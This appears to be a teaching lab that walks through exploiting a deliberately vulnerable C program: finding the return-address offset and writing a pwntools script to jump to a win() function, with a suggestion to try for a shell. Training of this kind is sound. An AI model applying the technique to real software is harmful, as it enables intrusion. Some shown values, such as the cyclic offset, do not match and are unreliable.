# Exercise 4 — Buffer Overflow: Writing an Exploit

**Goal:** Compile the vulnerable program, find the exact byte offset from the input buffer to the return address using a cyclic pattern, then write a Python exploit that overwrites the return address with the address of `win()`.

**File:** `program-vuln.c`

---

## Background

In `program-vuln.c`, `gets(input)` reads user input into a 64-byte heap buffer with no bounds check. That buffer is then passed to `say_hello()`, where `sprintf` copies it into `buf[32]` on the stack — also with no bounds check on the format string output.

The overflow path:
```
gets(input)              <- reads attacker input into heap
say_hello(input)         <- passes it as 'name'
sprintf(buf, "%s, %s", greeting, name)   <- writes "Hello!, " + name into buf[32]
```

If `name` is long enough, `sprintf` writes past `buf[32]` into the saved RBP and then into the return address.

Stack layout inside `say_hello`:

```
[rbp - 32]  buf[32]           <- sprintf writes here
[rbp +  0]  saved RBP         <- 8 bytes, overwritten next
[rbp +  8]  return address    <- overwrite this to redirect execution
```

---

## Step 1 — Compile the vulnerable binary

```bash
gcc -g -fno-stack-protector -no-pie -w -o program-vuln program-vuln.c
```

- `-w` suppresses compiler warnings (expected here — `gets` is intentionally unsafe)
- If you see `error: implicit declaration of function 'gets'`, the fix is already in `program-vuln.c` as a forward declaration; recompile and it will succeed

---

## Step 2 — Verify win() exists and find its address

```bash
objdump -d program-vuln | grep '<win>'
```

Expected output:

```
0000000000401126 <win>:
```

Write down the address of `win`. You will use it in the exploit script.

You can also find it this way inside GDB:

```bash
gdb ./program-vuln
(gdb) print win
```

Output:

```
$1 = {void ()} 0x401126 <win>
```

---

## Step 3 — Find the offset with a cyclic pattern

A cyclic pattern is a string where every 8-byte sequence is unique. When the program crashes with a cyclic pattern as input, the value that ended up in RIP tells you exactly which position in the pattern overwrote the return address.

Launch GDB:

```bash
gdb ./program-vuln
```

Generate a 60-byte cyclic pattern and run the program with it as input:

```
(gdb) run <<< $(python3 -c "from pwn import *; print(cyclic(60).decode())")
```

The program will crash. GDB shows the fault.

If you have pwndbg installed, the output looks like:

```
Program received signal SIGSEGV, Segmentation fault.
0x000000006161616c in ?? ()

LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────[ REGISTERS ]──────────────────────────
 RIP  0x6161616c
```

The value in RIP (`0x6161616c` in this example) is part of the cyclic pattern. Note it.

---

## Step 4 — Calculate the offset

In a separate terminal (or after quitting GDB):

```bash
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
```

Replace `0x6161616c` with the value you saw in RIP.

Expected output:

```
32
```

This means 32 bytes of input (after `sprintf` prepends `"Hello!, "`) reach the return address. In other words: craft your payload as **32 bytes of padding + the address you want to jump to**.

---

## Step 5 — Write the exploit script

Create a file called `exploit.py` in this directory:

```bash
nano exploit.py
```

Paste this content:

```python
from pwn import *

elf = ELF('./program-vuln')

win_addr = elf.symbols['win']

offset  = 32
payload = b'A' * offset
payload += p64(win_addr)

p = process('./program-vuln')
p.sendline(payload)
p.interactive()
```

Save and exit (`Ctrl+O`, `Enter`, `Ctrl+X` in nano).

---

## Step 6 — Run the exploit

```bash
python3 exploit.py
```

Expected output:

```
[*] '/home/kali/exercises/program-vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './program-vuln': pid 13337
[*] Switching to interactive mode
Enter your name: Hello!, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] You redirected execution to win()!
[*] Got EOF while reading in interactive
```

The line `[+] You redirected execution to win()!` confirms execution was redirected from `main`'s return path to `win()`.

---

## Step 7 — Verify in GDB (optional but recommended)

Run the exploit under GDB to watch the return address get overwritten:

```bash
gdb ./program-vuln
(gdb) break say_hello
(gdb) run <<< $(python3 -c "from pwn import *; payload = b'A'*32 + p64(0x401126); sys.stdout.buffer.write(payload + b'\n')")
```

After hitting the breakpoint:

```
(gdb) x/gx $rbp+8
```

You should see the return address is now `0x401126` — the address of `win()` — instead of an address inside `main`.

Step through with:

```
(gdb) finish
```

Watch GDB land inside `win()`.

---

## How the exploit works — step by step

```
1. exploit.py sends: "A" * 32 + \x26\x11\x40\x00\x00\x00\x00\x00
                     (32 bytes)   (win() address in little-endian)

2. gets(input) stores the full payload in the heap buffer

3. say_hello(input) is called; name = our payload

4. sprintf writes:
   "Hello!, " (8 bytes) + our 32 A's + win_addr = fills buf[32] + overwrites saved RBP + overwrites return address

5. say_hello executes RET:
   - pops [rbp+8] into RIP
   - [rbp+8] now contains win()
   - CPU jumps to win()

6. win() prints its message and returns
```

---

## What to try next

- Change `win()` to `system("/bin/sh")` and add `/bin/sh` as a string in the binary. See if you can pop a shell.
- Try the exploit without the `-fno-stack-protector` flag. What happens?

That second question is exercise 5.
